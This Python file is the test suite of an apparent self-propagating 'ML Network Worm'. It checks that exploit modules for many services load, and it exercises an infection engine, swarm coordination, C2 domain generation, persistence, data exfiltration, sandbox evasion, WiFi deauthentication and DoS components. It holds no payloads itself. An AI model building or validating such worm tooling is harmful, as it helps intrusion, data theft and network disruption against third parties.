"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Comprehensive Testing Suite for ML Network Worm
Tests all components with detailed reporting
"""


import sys

if sys.stdout.encoding.lower() != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8")

import os
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from configs.config import Config
except ImportError:
    from config import Config

from utils.logger import logger


class TestResult:
    """Represents a test result"""

    def __init__(self, name: str, category: str):
        self.name = name
        self.category = category
        self.passed = False
        self.duration = 0.0
        self.error: Optional[str] = None
        self.details = {}

    def __repr__(self):
        status = "✅ PASS" if self.passed else "❌ FAIL"
        return f"{status} {self.name} ({self.duration:.2f}s)"


class ComprehensiveTestSuite:
    """
    Comprehensive testing suite for all worm components
    """

    def __init__(self):
        self.results = []
        self.start_time = None
        self.end_time = None

        logger.info("Comprehensive Test Suite initialized")

    def run_all_tests(self) -> Dict:
        """Run all test categories"""
        print("\n" + "=" * 80)
        print(" " * 25 + "COMPREHENSIVE TEST SUITE")
        print("=" * 80)

        self.start_time = time.time()

        # Test categories
        categories = [
            ("Core Components", self.test_core_components),
            ("Exploitation", self.test_exploitation),
            ("Infection Engine", self.test_infection_engine),
            ("Multi-Agent Swarm", self.test_multi_agent_swarm),
            ("Self-Healing", self.test_self_healing),
            ("Exploitation Chains", self.test_exploitation_chains),
            ("C2 Infrastructure", self.test_c2_infrastructure),
            ("Post-Exploitation", self.test_post_exploitation),
            ("Evasion", self.test_evasion),
            ("Network Attacks", self.test_network_attacks),
            ("Monitoring", self.test_monitoring),
            ("Integration", self.test_integration),
            ("Stress Tests", self.test_stress),
            ("Security Validation", self.test_security_validation),
        ]

        for category_name, test_func in categories:
            print(f"\n{'='*80}")
            print(f"CATEGORY: {category_name}")
            print(f"{'='*80}")

            try:
                test_func()
            except Exception as e:
                logger.error(f"Category {category_name} failed: {e}")

        self.end_time = time.time()

        # Generate report
        return self.generate_report()

    def test_core_components(self):
        """Test core components"""

        # Test 1: Logger
        result = TestResult("Logger Initialization", "Core")
        start = time.time()
        try:
            from utils.logger import logger

            logger.info("Test message")
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 2: Config
        result = TestResult("Config Loading", "Core")
        start = time.time()
        try:
            from configs.config import Config

            config = Config()
            assert config is not None
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 3: Scanner
        result = TestResult("Scanner Initialization", "Core")
        start = time.time()
        try:
            from scanner import IntelligentScanner

            scanner = IntelligentScanner()
            assert scanner is not None
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def test_exploitation(self):
        """Test exploitation modules"""

        exploits = [
            "smb_exploit",
            "ssh_exploit",
            "rdp_exploit",
            "ftp_exploit",
            "mysql_exploit",
            "postgresql_exploit",
            "redis_exploit",
            "mongodb_exploit",
            "telnet_exploit",
            "vnc_exploit",
            "snmp_exploit",
            "docker_exploit",
            "web_exploit",
        ]

        for exploit_name in exploits:
            result = TestResult(f"Exploit: {exploit_name}", "Exploitation")
            start = time.time()
            try:
                # Test exploit import
                module_path = f"exploits.modules.{exploit_name}"
                __import__(module_path)
                result.passed = True
            except Exception as e:
                result.error = str(e)
            result.duration = time.time() - start
            self.results.append(result)
            print(f"  {result}")

    def test_infection_engine(self):
        """Test enhanced infection engine"""

        # Test 1: Engine initialization
        result = TestResult("Infection Engine Init", "Infection")
        start = time.time()
        try:
            from infection.enhanced_infection import InfectionEngine

            engine = InfectionEngine()
            assert len(engine.infection_methods) == 7
            result.passed = True
            result.details["methods"] = len(engine.infection_methods)
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 2: Infection execution
        result = TestResult("Infection Execution", "Infection")
        start = time.time()
        try:
            from infection.enhanced_infection import InfectionEngine

            engine = InfectionEngine()

            target = {"ip": "192.168.1.100", "os": "Windows", "open_ports": [80, 443]}
            exploit_result = {"success": True, "exploit_name": "test"}

            success, details = engine.infect_host(target, exploit_result)
            assert success
            assert len(details["methods_successful"]) > 0

            result.passed = True
            result.details["methods_successful"] = len(details["methods_successful"])
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 3: Statistics
        result = TestResult("Infection Statistics", "Infection")
        start = time.time()
        try:
            stats = engine.get_infection_stats()
            assert "success_rate" in stats
            assert "total_infected" in stats
            result.passed = True
            result.details["success_rate"] = f"{stats['success_rate']:.1%}"
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def test_multi_agent_swarm(self):
        """Test enhanced multi-agent swarm"""

        # Test 1: Agent creation
        result = TestResult("Agent Creation", "Swarm")
        start = time.time()
        try:
            from swarm.enhanced_swarm import EnhancedSwarmAgent

            agent = EnhancedSwarmAgent(role="coordinator")
            assert agent.agent_id is not None
            assert agent.role == "coordinator"
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 2: Coordinator
        result = TestResult("Swarm Coordinator", "Swarm")
        start = time.time()
        try:
            from swarm.enhanced_swarm import EnhancedSwarmAgent, EnhancedSwarmCoordinator

            coordinator = EnhancedSwarmCoordinator()

            # Register agents
            for i in range(5):
                agent = EnhancedSwarmAgent()
                coordinator.register_agent(agent)

            assert len(coordinator.agents) == 5
            result.passed = True
            result.details["agents"] = len(coordinator.agents)
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 3: Knowledge sharing
        result = TestResult("Knowledge Sharing", "Swarm")
        start = time.time()
        try:
            agent = list(coordinator.agents.values())[0]
            agent.discover_host("192.168.1.100", {"open_ports": [22, 80]})
            coordinator.share_knowledge(agent.agent_id, agent.shared_knowledge)

            assert len(coordinator.global_knowledge) > 0
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 4: Target assignment
        result = TestResult("Target Assignment", "Swarm")
        start = time.time()
        try:
            targets = coordinator.assign_targets(agent.agent_id, count=3)
            result.passed = True
            result.details["targets_assigned"] = len(targets)
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 5: Performance scoring
        result = TestResult("Performance Scoring", "Swarm")
        start = time.time()
        try:
            agent.metrics["scans_performed"] = 100
            agent.metrics["exploits_attempted"] = 50
            agent.metrics["successful_infections"] = 30

            score = agent.get_performance_score()
            assert 0 <= score <= 100
            result.passed = True
            result.details["score"] = f"{score:.1f}"
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def test_self_healing(self):
        """Test self-healing module"""

        # Test 1: Health check
        result = TestResult("Health Check", "Self-Healing")
        start = time.time()
        try:
            from core.self_healing import SelfHealing

            healer = SelfHealing()
            health = healer.perform_health_check()

            assert "overall_health" in health
            assert 0 <= health["overall_health"] <= 100
            result.passed = True
            result.details["health"] = f"{health['overall_health']:.1f}%"
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 2: Auto-repair
        result = TestResult("Auto-Repair", "Self-Healing")
        start = time.time()
        try:
            repair_results = healer.auto_repair()
            assert "repairs_successful" in repair_results
            result.passed = True
            result.details["repairs"] = repair_results["repairs_successful"]
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def test_exploitation_chains(self):
        """Test exploitation chain engine"""

        # Test 1: Chain loading
        result = TestResult("Chain Loading", "Exploitation Chains")
        start = time.time()
        try:
            from exploits.exploitation_chain import ExploitationChainEngine

            engine = ExploitationChainEngine()

            assert len(engine.chains) == 5
            result.passed = True
            result.details["chains"] = len(engine.chains)
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 2: Chain selection
        result = TestResult("Chain Selection", "Exploitation Chains")
        start = time.time()
        try:
            target = {"ip": "192.168.1.100", "os": "Windows", "open_ports": [445]}
            chain_name = engine.select_chain(target)

            assert chain_name in engine.chains
            result.passed = True
            result.details["selected"] = chain_name
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 3: Custom chain
        result = TestResult("Custom Chain Creation", "Exploitation Chains")
        start = time.time()
        try:
            steps = [("Step1", True), ("Step2", False), ("Step3", True)]
            custom_chain = engine.create_custom_chain("Test_Chain", steps)

            assert len(custom_chain.steps) == 3
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def test_c2_infrastructure(self):
        """Test C2 infrastructure"""

        # Test 1: DGA
        result = TestResult("DGA Domain Generation", "C2")
        start = time.time()
        try:
            from c2.dga import DomainGenerator

            dga = DomainGenerator()
            domains = dga.get_current_domains(count=10)

            assert len(domains) == 10
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def test_post_exploitation(self):
        """Test post-exploitation modules"""

        modules = [
            ("Privilege Escalation", "post_exploit.privilege_escalation"),
            ("Persistence", "post_exploit.persistence"),
            ("Data Exfiltration", "post_exploit.data_exfiltration"),
            ("Lateral Movement", "post_exploit.lateral_movement"),
        ]

        for name, module_path in modules:
            result = TestResult(name, "Post-Exploitation")
            start = time.time()
            try:
                __import__(module_path)
                result.passed = True
            except Exception as e:
                result.error = str(e)
            result.duration = time.time() - start
            self.results.append(result)
            print(f"  {result}")

    def test_evasion(self):
        """Test evasion modules"""

        result = TestResult("Advanced Evasion", "Evasion")
        start = time.time()
        try:
            from evasion.advanced_evasion import AdvancedEvasion

            evasion = AdvancedEvasion()
            is_safe, checks = evasion.check_environment()

            assert isinstance(is_safe, bool)
            assert isinstance(checks, dict)
            result.passed = True
            result.details["evasion_score"] = f"{evasion.evasion_score}/6"
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def test_network_attacks(self):
        """Test network attack modules"""

        # Test 1: WiFi Deauth
        result = TestResult("WiFi Deauth", "Network Attacks")
        start = time.time()
        try:
            from attacks.network_attacks import WiFiDeauth

            wifi = WiFiDeauth()
            assert wifi is not None
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 2: Traffic Saturation
        result = TestResult("Traffic Saturation", "Network Attacks")
        start = time.time()
        try:
            from attacks.network_attacks import TrafficSaturation

            dos = TrafficSaturation()
            assert dos is not None
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def test_monitoring(self):
        """Test monitoring dashboard"""

        result = TestResult("Monitoring Dashboard", "Monitoring")
        start = time.time()
        try:
            from monitoring.dashboard import MonitoringDashboard

            dashboard = MonitoringDashboard(port=8081)

            # Test logging
            dashboard.log_activity("test", "Test message", "192.168.1.1")
            dashboard.update_device("192.168.1.1", "testing")

            assert len(dashboard.activity_log) > 0
            assert len(dashboard.devices) > 0
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def test_integration(self):
        """Test component integration"""

        result = TestResult("Full Integration", "Integration")
        start = time.time()
        try:
            # Import all major components
            from core.self_healing import SelfHealing
            from exploits.exploitation_chain import ExploitationChainEngine
            from infection.enhanced_infection import InfectionEngine
            from swarm.enhanced_swarm import EnhancedSwarmCoordinator

            # Initialize
            infection = InfectionEngine()
            swarm = EnhancedSwarmCoordinator()
            chains = ExploitationChainEngine()
            healing = SelfHealing()

            assert all([infection, swarm, chains, healing])
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def test_stress(self):
        """Stress tests"""

        # Test 1: Multiple agents
        result = TestResult("100 Agents Creation", "Stress")
        start = time.time()
        try:
            from swarm.enhanced_swarm import EnhancedSwarmAgent, EnhancedSwarmCoordinator

            coordinator = EnhancedSwarmCoordinator()

            for i in range(100):
                agent = EnhancedSwarmAgent()
                coordinator.register_agent(agent)

            assert len(coordinator.agents) == 100
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 2: Rapid infections
        result = TestResult("1000 Rapid Infections", "Stress")
        start = time.time()
        try:
            from infection.enhanced_infection import InfectionEngine

            engine = InfectionEngine()

            target = {"ip": "192.168.1.100", "os": "Windows", "open_ports": [80]}
            exploit_result = {"success": True, "exploit_name": "test"}

            for i in range(1000):
                target["ip"] = f"192.168.1.{i % 255}"
                engine.infect_host(target, exploit_result)

            stats = engine.get_infection_stats()
            assert stats["total_attempts"] == 1000
            result.passed = True
            result.details["success_rate"] = f"{stats['success_rate']:.1%}"
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def test_security_validation(self):
        """Security validation tests"""

        # Test 1: Kill switch
        result = TestResult("Kill Switch", "Security")
        start = time.time()
        config = None
        try:
            from configs.config import Config

            config = Config()
            assert hasattr(config, "safety")
            assert hasattr(config.safety, "kill_switch_enabled")
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

        # Test 2: Geofencing
        result = TestResult("Geofencing", "Security")
        start = time.time()
        try:
            if config is None:
                from configs.config import Config

                config = Config()
            assert hasattr(config.safety, "geofence_enabled")
            assert hasattr(config.safety, "allowed_networks")
            result.passed = True
        except Exception as e:
            result.error = str(e)
        result.duration = time.time() - start
        self.results.append(result)
        print(f"  {result}")

    def generate_report(self) -> Dict:
        """Generate comprehensive test report"""

        total_duration = self.end_time - self.start_time

        # Calculate statistics
        total_tests = len(self.results)
        passed = sum(1 for r in self.results if r.passed)
        failed = total_tests - passed
        success_rate = (passed / total_tests * 100) if total_tests > 0 else 0

        # Group by category
        by_category = {}
        for result in self.results:
            if result.category not in by_category:
                by_category[result.category] = {"passed": 0, "failed": 0, "total": 0}

            by_category[result.category]["total"] += 1
            if result.passed:
                by_category[result.category]["passed"] += 1
            else:
                by_category[result.category]["failed"] += 1

        # Print report
        print("\n" + "=" * 80)
        print(" " * 30 + "TEST REPORT")
        print("=" * 80)

        print(f"\nOverall Statistics:")
        print(f"  Total Tests: {total_tests}")
        print(f"  Passed: {passed} ({success_rate:.1f}%)")
        print(f"  Failed: {failed}")
        print(f"  Duration: {total_duration:.2f}s")

        print(f"\nBy Category:")
        for category, stats in sorted(by_category.items()):
            cat_rate = (stats["passed"] / stats["total"] * 100) if stats["total"] > 0 else 0
            status = "✅" if cat_rate == 100 else "⚠️" if cat_rate >= 50 else "❌"
            print(
                f"  {status} {category:.<40} {stats['passed']}/{stats['total']} ({cat_rate:.0f}%)"
            )

        # Failed tests
        failed_tests = [r for r in self.results if not r.passed]
        if failed_tests:
            print(f"\nFailed Tests:")
            for result in failed_tests:
                print(f"  ❌ {result.name} ({result.category})")
                if result.error:
                    print(f"     Error: {result.error}")

        print("\n" + "=" * 80)

        if success_rate == 100:
            print("🎉 ALL TESTS PASSED! System is fully operational.")
        elif success_rate >= 90:
            print("✅ EXCELLENT! Most tests passed, minor issues detected.")
        elif success_rate >= 75:
            print("⚠️ GOOD! Majority of tests passed, some issues need attention.")
        else:
            print("❌ WARNING! Significant issues detected, review required.")

        print("=" * 80)

        return {
            "total_tests": total_tests,
            "passed": passed,
            "failed": failed,
            "success_rate": success_rate,
            "duration": total_duration,
            "by_category": by_category,
            "failed_tests": [(r.name, r.error) for r in failed_tests],
        }


if __name__ == "__main__":
    suite = ComprehensiveTestSuite()
    report = suite.run_all_tests()

    # Exit with appropriate code
    sys.exit(0 if report["failed"] == 0 else 1)
